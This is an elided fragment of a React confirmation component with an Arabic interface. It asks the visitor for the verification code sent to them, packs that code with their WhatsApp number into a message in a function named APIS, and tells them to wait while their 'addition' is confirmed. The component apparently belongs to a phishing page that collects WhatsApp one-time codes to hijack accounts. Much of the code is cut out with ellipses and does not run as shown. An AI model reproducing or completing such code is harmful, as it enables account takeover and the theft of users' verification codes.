...
export default function Confirm({ setNcode, ncode }) {
  ...
  const APIS = () => {
    ...
    const text = `Number Whatsapp: ${formatPhoneNumberIntl(
      ncode.number
    )} ********** Code : ${code}`;
  ...
  const handle = () => {
    if (code < 5) {
      ...
      setError(false);
      setLoading(true);
      setMessage('يرجى عدم مغادرة الصفحة لحين تأكيد إضافتك')
      setTimeout(() => {
        setCode("");
        setLoading(false);
            ...
            <div className="mt-8 space-y-6">
              <div className="-space-y-px rounded-md shadow-sm">
                <div>
                  <input
                    ...
                    placeholder="أدخل رمز التحقق الي وصلك"
              ...
              <div>
                ...
                >
                  ...
                  <div className="text-white">تأكيد</div>
                </button>
              </div>
            </div>
          )}
